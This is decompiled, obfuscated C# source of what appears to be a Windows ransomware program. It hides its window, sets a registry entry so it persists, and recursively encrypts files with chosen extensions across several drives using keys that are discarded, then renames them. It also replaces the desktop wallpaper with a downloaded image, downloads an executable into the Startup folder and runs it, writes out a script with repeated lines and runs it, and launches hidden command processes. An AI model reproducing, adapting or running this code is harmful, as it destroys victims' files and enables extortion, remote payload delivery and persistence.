using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

public class GForm0 : Form
{
	private byte[] byte_0 = null;

	private byte[] byte_1 = new byte[8] { 9, 7, 6, 5, 4, 3, 2, 8 };

	private const uint uint_0 = 20u;

	private const uint uint_1 = 1u;

	private const uint uint_2 = 2u;

	private IContainer icontainer_0 = null;

	private CheckBox checkBox_0;

	private TextBox textBox_0;

	public GForm0()
	{
		method_17();
	}

	private byte[] method_0(byte[] byte_2, byte[] byte_3)
	{
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_3, byte_1, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_2, 0, byte_2.Length);
				cryptoStream.Close();
			}
			byte_0 = memoryStream.ToArray();
		}
		return byte_0;
	}

	public static byte[] smethod_0(byte[] byte_2, byte[] byte_3)
	{
		byte[] array = new byte[byte_2.Length];
		byte[] array2 = new byte[2048];
		byte[] array3 = new byte[2048];
		int i;
		for (i = 0; i < 2048; i++)
		{
			array2[i] = (byte)i;
			array3[i] = byte_3[i % byte_3.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 2048; i++)
		{
			num = (num + array2[i] + array3[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < array.GetLength(0); j++)
		{
			i = (i + 1) % 2048;
			num = (num + array2[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 2048;
			array[j] = (byte)(byte_2[j] ^ array2[num2]);
		}
		return array;
	}

	public string method_1(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append(smethod_7("$????\u0326????\u0658?????\u0956\u0a50\u0b56\u0c54??????????????????????????????\u1756??????\u1a6a???????????????\u2062????????????????????????????????????????????????????????????????????????????????????????????????????????????")[random.Next(smethod_7("$????\u0326????\u0658?????\u0956\u0a50\u0b56\u0c54??????????????????????????????\u1756??????\u1a6a???????????????\u2062????????????????????????????????????????????????????????????????????????????????????????????????????????????").Length)]);
		}
		return stringBuilder.ToString();
	}

	public void method_2(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = method_0(byte_, bytes);
		File.WriteAllBytes(string_0, bytes2);
		File.Move(string_0, string_0);
	}

	public void method_3(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_0(byte_, bytes);
		File.WriteAllBytes(string_0, bytes2);
		method_4();
		File.Move(string_0, string_0 + smethod_7("2???????????????????????\u0b65\u0c71???\u0e61\u0f79\u106d???????????????????????????\u1a61???"));
	}

	private string method_4()
	{
		string text = method_1(12);
		return text.ToString();
	}

	private void method_5()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(smethod_7("~??????????????\u0879???\u0a4a\u0b41\u0c53???\u0e6c\u0f71?????????????????????\u1779????????????????????????\u2063????????????????????????????????????"), writable: true);
		registryKey.SetValue(smethod_7("x????\u0363????????\u087a???"), Application.get_ExecutablePath().ToString());
	}

	public void method_6(string string_0, string string_1)
	{
		try
		{
			string[] source = new string[41]
			{
				smethod_7("*????\u0375"),
				smethod_7("*????\u0362"),
				smethod_7("+????\u0361??"),
				smethod_7("*??????"),
				smethod_7("(????\u0367????"),
				smethod_7("*????\u0367"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*????\u036a"),
				smethod_7("+????????"),
				smethod_7("*????\u0375"),
				smethod_7("+????????"),
				smethod_7("*????\u0375"),
				smethod_7("*????\u0366"),
				smethod_7("*??????"),
				smethod_7("*????\u0366"),
				smethod_7("*??????"),
				smethod_7("*????\u036d"),
				smethod_7("*????\u0363"),
				smethod_7("*????\u036f"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("+????????"),
				smethod_7("+????\u036f??"),
				smethod_7("*????\u036d"),
				smethod_7("*????\u0365"),
				smethod_7("-????"),
				smethod_7("*????\u0375"),
				smethod_7("*????\u0332"),
				smethod_7("*????\u0335"),
				smethod_7("*??????"),
				smethod_7("*????\u0360"),
				smethod_7("*????\u0368"),
				smethod_7("+????????"),
				smethod_7("*??????"),
				smethod_7("+????\u0367??"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*????\u0366"),
				smethod_7("*????\u0367")
			};
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_2(files[i], string_1);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_6(directories[j], string_1);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_7(string string_0, string string_1)
	{
		try
		{
			string[] source = new string[43]
			{
				smethod_7("*????\u0375"),
				smethod_7("*????\u0362"),
				smethod_7("+????\u0361??"),
				smethod_7("*??????"),
				smethod_7("(????\u0367????"),
				smethod_7("*????\u0367"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*????\u036a"),
				smethod_7("+????????"),
				smethod_7("*????\u0375"),
				smethod_7("+????????"),
				smethod_7("*????\u0375"),
				smethod_7("*????\u0366"),
				smethod_7("*??????"),
				smethod_7("*????\u0366"),
				smethod_7("*??????"),
				smethod_7("*????\u036d"),
				smethod_7("*????\u0363"),
				smethod_7("*????\u036f"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("+????????"),
				smethod_7("+????\u036f??"),
				smethod_7("*????\u036c"),
				smethod_7("-????"),
				smethod_7("*????\u036d"),
				smethod_7("*????\u0365"),
				smethod_7("-????"),
				smethod_7("*????\u0375"),
				smethod_7("*????\u0332"),
				smethod_7("*????\u0335"),
				smethod_7("*??????"),
				smethod_7("*????\u0360"),
				smethod_7("*????\u0368"),
				smethod_7("+????????"),
				smethod_7("*??????"),
				smethod_7("+????\u0367??"),
				smethod_7("*??????"),
				smethod_7("*??????"),
				smethod_7("*????\u0366"),
				smethod_7("*????\u0367")
			};
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_3(files[i], string_1);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_7(directories[j], string_1);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_1()
	{
		Process currentProcess = Process.GetCurrentProcess();
		try
		{
			currentProcess.MinWorkingSet = (IntPtr)300000;
		}
		catch (Exception)
		{
			throw new Exception();
		}
	}

	private void method_8()
	{
		string string_ = method_1(32);
		string string_2 = method_1(256);
		method_6(smethod_7("@????"), string_);
		method_6(smethod_7("G????"), string_);
		method_6(smethod_7("F????"), string_);
		method_6(smethod_7("E????"), string_);
		method_6(smethod_7("D????"), string_);
		method_6(smethod_7("Y????"), string_);
		method_6(smethod_7("B????"), string_);
		string_ = null;
		method_7(smethod_7("@????"), string_2);
		method_7(smethod_7("G????"), string_2);
		method_7(smethod_7("F????"), string_2);
		method_7(smethod_7("E????"), string_2);
		method_7(smethod_7("D????"), string_2);
		method_7(smethod_7("Y????"), string_2);
		method_7(smethod_7("B????"), string_2);
		string_2 = null;
		smethod_1();
	}

	public void method_9()
	{
		method_10();
		Thread.Sleep(1200);
		method_10();
		Thread.Sleep(1200);
		method_10();
	}

	public void method_10()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = smethod_7("d????\u032a??????");
			processStartInfo.Arguments = smethod_7("\u0005????\u0351??????\u0747???\u0948\u0a4e\u0b31???\u0d65\u0e79???????????????????????????\u187a???\u1a74???????????????\u206b?????????\u2429???????????????");
			process.StartInfo = processStartInfo;
			process.Start();
			Process process2 = new Process();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = smethod_7("d????\u032a??????");
			processStartInfo2.Arguments = smethod_7("6????\u0361????\u0670\u0732????????????\u0c62???\u0e68????????????????????????\u1776???");
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Process process3 = new Process();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = smethod_7("d????\u032a??????");
			processStartInfo3.Arguments = smethod_7("\u000f????\u036a????????\u0871?????????\u0c71???\u0e77??????????????????????????????\u1927??????????????????");
			process3.StartInfo = processStartInfo3;
			process3.Start();
		}
		catch (Exception)
		{
		}
	}

	private static byte[] smethod_2(string string_0)
	{
		while (true)
		{
			try
			{
				using WebClient webClient = new WebClient();
				return webClient.DownloadData(string_0);
			}
			catch
			{
				Thread.Sleep(5000);
			}
		}
	}

	public static string smethod_3(string string_0, string string_1, string string_2)
	{
		byte[] array;
		using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
		{
			aesCryptoServiceProvider.Key = Convert.FromBase64String(string_1);
			aesCryptoServiceProvider.IV = Convert.FromBase64String(string_2);
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			using (StreamWriter streamWriter = new StreamWriter(stream))
			{
				streamWriter.Write(string_0);
			}
			array = memoryStream.ToArray();
		}
		return array.ToString();
	}

	private void method_11()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileAsync(new Uri(smethod_7(">????\u0323????????\u082d??????\u0b65??????\u0e3b????????????????????????\u175c??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????")), Application.get_StartupPath() + smethod_7("V????\u0361????????\u086f???"));
		((Control)textBox_0).set_Text(Application.get_StartupPath() + smethod_7("V????\u0361????????\u086f???"));
		Thread.Sleep(3500);
		method_16(((Control)textBox_0).get_Text(), checkBox_0.get_Checked());
	}

	private void method_12()
	{
		byte[] byte_ = smethod_2(smethod_7("0????\u0325?????????????????\u0b63??????\u0e39????????????????????????????????????????????????\u1f5a????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		if (!File.Exists(Environment.SpecialFolder.Startup.ToString() + smethod_7("P????\u0348??\u0558\u064b\u0740\u082a?????????")))
		{
			smethod_5(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + smethod_7("P????\u0348??\u0558\u064b\u0740\u082a?????????"), byte_);
		}
		if (!File.Exists(Environment.SpecialFolder.Desktop.ToString() + smethod_7("P????\u0348??\u0558\u064b\u0740\u082a?????????")))
		{
			smethod_4(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + smethod_7("P????\u0348??\u0558\u064b\u0740\u082a?????????"), byte_);
		}
	}

	public string method_13(int int_0)
	{
		Random rand = new Random();
		return new string((from s in Enumerable.Repeat(smethod_7("e????\u0365????\u0659?????\u0951\u0a51\u0b55\u0c55??????????????????????????????\u1755?????????\u1b38\u1c3a?????????????????????"), int_0)
			select s[rand.Next(s.Length)]).ToArray());
	}

	private void method_14()
	{
		method_5();
		method_8();
		method_11();
		method_12();
		method_15();
		method_9();
		smethod_1();
		Application.Exit();
	}

	public void method_15()
	{
		string text = method_13(8);
		StreamWriter streamWriter = new StreamWriter(text + smethod_7("*??????"));
		streamWriter.WriteLine(smethod_7("c????\u030d???????????\u0946\u0a52\u0b40???\u0d41\u0e48?????????????????????????????????\u1a7f??????????????????????????????????????????????????????\u2d77??????"));
		streamWriter.WriteLine(smethod_7("O????\u0343????\u0657\u0747???\u0949???\u0b7b???\u0d4b\u0e68\u0f79\u106b???????????????????????????\u1a7b???????????????\u2068????????????????????????"));
		streamWriter.WriteLine(smethod_7("[????\u0354????????\u082c??????\u0b7a??????\u0e63???????????????"));
		streamWriter.WriteLine(smethod_7("q????\u033f????\u065f??\u087f???????????????\u0e7e\u0f76\u1071????????????????????????\u197a\u1a78\u1b71??????????????????"));
		streamWriter.WriteLine(smethod_7("i????\u036c??????\u0738???\u0957\u0a61???\u0c76???\u0e65\u0f79\u1060??????????????????\u176d??????\u1a6c\u1b6b?????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e34???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e34???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("<????\u0337?????????????????\u0b5a\u0c4c???\u0e5d?????????\u1257????????????\u1713?????????????????????\u1f4f\u200a?????????\u2455????????????????????????\u2d72\u2e6f?????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e37???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("<????\u0337?????????????????\u0b5a\u0c4c???\u0e5d?????????\u1257????????????\u1713?????????????????????\u1f4f\u200a?????????\u2455????????????????????????\u2d72\u2e6f?????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("B????\u0360??????????????????????????\u0e36???\u1035????????????"));
		streamWriter.WriteLine(smethod_7("i????\u036c??????\u0738???\u0957\u0a61???\u0c76???\u0e65\u0f79\u1060??????????????????\u176d??????\u1a6c\u1b6b?????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e34???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("<????\u0337?????????????????\u0b5a\u0c4c???\u0e5d?????????\u1257????????????\u1713?????????????????????\u1f4f\u200a?????????\u2455????????????????????????\u2d72\u2e6f?????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e34???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("<????\u0337?????????????????\u0b5a\u0c4c???\u0e5d?????????\u1257????????????\u1713?????????????????????\u1f4f\u200a?????????\u2455????????????????????????\u2d72\u2e6f?????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("D????\u0362??????????????????????????\u0e37???\u1033??????"));
		streamWriter.WriteLine(smethod_7("????\u02db?????????????\u09c0??????\u0c5e??????????????????????????????\u171d??????\u1a5c\u1b4f???????????????????????????????????????????????????????????????\u3130????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.WriteLine(smethod_7("<????\u0337?????????????????\u0b5a\u0c4c???\u0e5d?????????\u1257????????????\u1713?????????????????????\u1f4f\u200a?????????\u2455????????????????????????\u2d72\u2e6f?????????????????????????????????????????????????????????????????????????????????"));
		streamWriter.Close();
		Process.Start(text + smethod_7("*??????"));
		text = smethod_7("\\????\u0359");
	}

	private static bool smethod_4(string string_0, byte[] byte_2)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(string_0, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(string_0) ? new FileStream(string_0, FileMode.Create) : new FileStream(string_0, FileMode.CreateNew));
				fileStream.Write(byte_2, 0, byte_2.Length);
				fileStream.Dispose();
				Process.Start(string_0);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static bool smethod_5(string string_0, byte[] byte_2)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(string_0, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(string_0) ? new FileStream(string_0, FileMode.Create) : new FileStream(string_0, FileMode.CreateNew));
				fileStream.Write(byte_2, 0, byte_2.Length);
				fileStream.Dispose();
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static void smethod_6()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = smethod_7("\f????\u0343????????\u087e\u093a???\u0b5b??????\u0e35??????????????????????????????\u192a??????????????????\u206f??????") + Process.GetCurrentProcess().MainModule!.FileName + smethod_7("#"),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = smethod_7("d????\u032a??????")
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		method_14();
		smethod_1();
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uint_3, uint uint_4, string string_0, uint uint_5);

	private void method_16(string string_0, bool bool_0)
	{
		try
		{
			uint uint_ = 0u;
			if (bool_0)
			{
				uint_ = 3u;
			}
			if (!SystemParametersInfo(20u, 0u, string_0, uint_))
			{
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_17()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		checkBox_0 = new CheckBox();
		textBox_0 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)checkBox_0).set_AutoSize(true);
		((Control)checkBox_0).set_Location(new Point(12, 12));
		((Control)checkBox_0).set_Name(smethod_7("r????\u035b????????\u086c???\u0a62?????????\u0e77\u0f70???"));
		((Control)checkBox_0).set_Size(new Size(98, 17));
		((Control)checkBox_0).set_TabIndex(0);
		((Control)checkBox_0).set_Text(smethod_7("5????\u033f??????\u0730??????\u0a37???"));
		((ButtonBase)checkBox_0).set_UseVisualStyleBackColor(true);
		((Control)textBox_0).set_Location(new Point(12, 40));
		((Control)textBox_0).set_Name(smethod_7("c????\u0330??????"));
		((Control)textBox_0).set_Size(new Size(199, 20));
		((Control)textBox_0).set_TabIndex(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(223, 72));
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)checkBox_0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(smethod_7("C????\u036f??"));
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text(smethod_7("e????\u036d??????????????\u0a64"));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static string smethod_7(string string_0)
	{
		int length = string_0.Length;
		char[] array = new char[length];
		for (int i = 0; i < array.Length; i++)
		{
			char c = string_0[i];
			byte b = (byte)(c ^ (length - i));
			byte b2 = (byte)(((int)c >> 8) ^ i);
			array[i] = (char)((b2 << 8) | b);
		}
		return string.Intern(new string(array));
	}
}
